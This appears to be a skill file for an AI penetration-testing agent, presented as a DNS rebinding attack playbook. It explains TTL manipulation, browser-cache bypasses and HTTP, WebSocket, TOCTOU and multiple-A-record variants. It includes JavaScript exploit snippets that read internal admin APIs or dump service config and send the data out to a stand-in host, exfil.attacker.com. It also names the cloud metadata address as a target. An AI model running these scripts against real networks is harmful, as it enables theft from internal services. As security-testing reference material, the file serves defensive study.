---
name: dns-rebinding-attacks
description: >-
  DNS rebinding attack playbook. Use when testing applications that trust DNS resolution for origin checks, interact with internal services from browser context, or when SSRF is not possible server-side but the target has client-side fetch/XHR to attacker-controlled domains.
---

# SKILL: DNS Rebinding — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert DNS rebinding techniques for bypassing same-origin policy via DNS manipulation. Covers TTL tricks, browser cache bypasses, attack variants (HTTP, WebSocket, TOCTOU), internal service targeting, and tool usage. baseline analyses confuse DNS rebinding with SSRF — this skill clarifies the client-side nature and unique exploit paths.

## 0. RELATED ROUTING

- `ssrf-server-side-request-forgery` — server-side variant; DNS rebinding is the **client-side** counterpart
- `cors-cross-origin-misconfiguration` — when CORS misconfig allows direct cross-origin reads instead

---

## 1. CORE PRINCIPLE

The browser same-origin policy binds `protocol + host + port`. The **host** is resolved via DNS at connection time. If an attacker controls the DNS server for `attacker.com`, they can:

1. First resolution → attacker IP (serve malicious JS)
2. Second resolution → internal IP (victim's network)
3. Browser considers both responses same-origin (`attacker.com`)
4. Malicious JS reads responses from internal services

```
Victim visits attacker.com
        │
        ▼
DNS query: attacker.com → 1.2.3.4 (attacker server)
Browser loads malicious JS from 1.2.3.4
        │
        ▼
TTL expires (or forced flush)
        │
        ▼
JS triggers new request to attacker.com
DNS query: attacker.com → 192.168.1.1 (internal target)
Browser sends request to 192.168.1.1 as "attacker.com" origin
        │
        ▼
JS reads response — same-origin policy satisfied
Exfiltrates data to attacker's other endpoint
```

**Key insight**: SOP checks the hostname string, not the resolved IP. DNS can change the IP behind the same hostname.

---

## 2. TTL MANIPULATION

### DNS server configuration

The attacker runs an authoritative DNS server for their domain that alternates responses:

| Query # | Response | TTL |
|---|---|---|
| 1st | Attacker IP (e.g., `1.2.3.4`) | 0 |
| 2nd+ | Target internal IP (e.g., `192.168.1.1`) | 0 |

TTL=0 tells resolvers not to cache the result, forcing re-resolution on next connection.

### Browser DNS cache reality

Browsers maintain their own DNS cache that **ignores low TTLs**:

| Browser | Internal DNS Cache | Bypass Technique |
|---|---|---|
| Chrome | ~60 seconds minimum | Wait 60s; or use multiple subdomains |
| Firefox | ~60 seconds (network.dnsCacheExpiration) | Adjustable in about:config |
| Safari | ~varies | Generally shorter cache |
| Edge (Chromium) | Same as Chrome (~60s) | Same techniques as Chrome |

### Bypass strategies

```
1. Multiple A records technique:
   - Return BOTH attacker IP and target IP in single DNS response
   - Browser tries first IP; if connection fails → falls back to second
   - Block attacker IP after initial page load → forces fallback to internal IP
   
2. Subdomain flooding:
   - Use unique subdomains: a1.rebind.attacker.com, a2.rebind.attacker.com...
   - Each subdomain gets fresh DNS resolution (no cache hit)
   
3. Service worker flush:
   - Register service worker that intercepts and delays requests
   - By the time fetch executes, DNS cache has expired
```

---

## 3. ATTACK VARIANTS

### 3.1 Classic HTTP Rebinding

Target: internal web services (admin panels, REST APIs)

```javascript
// Served from attacker.com (first DNS resolution → attacker IP)
async function exploit() {
    // Wait for DNS cache to expire
    await sleep(65000); // >60s for Chrome
    
    // This request now resolves to internal IP
    const resp = await fetch('http://attacker.com:8080/api/admin/users');
    const data = await resp.text();
    
    // Exfiltrate to different attacker endpoint
    navigator.sendBeacon('https://exfil.attacker.com/log', data);
}
```

### 3.2 WebSocket Rebinding

WebSocket connections persist after DNS rebinding. Establish WS, then rebind:

```javascript
// After rebinding, WebSocket connects to internal service
const ws = new WebSocket('ws://attacker.com:9090/ws');
ws.onopen = () => {
    ws.send('{"action":"dump_config"}');
};
ws.onmessage = (e) => {
    fetch('https://exfil.attacker.com/ws-data', {
        method: 'POST',
        body: e.data
    });
};
```

### 3.3 Time-of-Check-to-Time-of-Use (TOCTOU)

Server-side applications that validate DNS at request time but reuse the connection:

```
1. Application receives URL: http://attacker.com/callback
2. Server resolves attacker.com → 1.2.3.4 (public IP) → passes validation
3. Server opens connection / follows redirect
4. DNS changes: attacker.com → 169.254.169.254
5. Connection reuse or redirect hits internal IP
```

This is a hybrid with SSRF — the rebinding happens in the server's resolver.

### 3.4 Multiple A Records (Fastest Variant)

```
DNS response for attacker.com:
  A  1.2.3.4       (attacker — serves JS)
  A  192.168.1.1   (target — internal service)
  
1. Browser connects to 1.2.3.4, loads page with JS
2. Attacker firewall blocks further connections from victim to 1.2.3.4
3. JS makes new request to attacker.com
4. Browser tries 1.2.3.4 → connection refused
5. Falls back to 192.168.1.1 → still same origin
6. Response readable by JS
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 4. HIGH-VALUE TARGETS
- 5. TOOLS
- 6. DNS REBINDING vs. SSRF
- 7. DEFENSES AND DEFENSE BYPASS
- 8. DECISION TREE
- 9. REAL-WORLD EXPLOITATION CHECKLIST
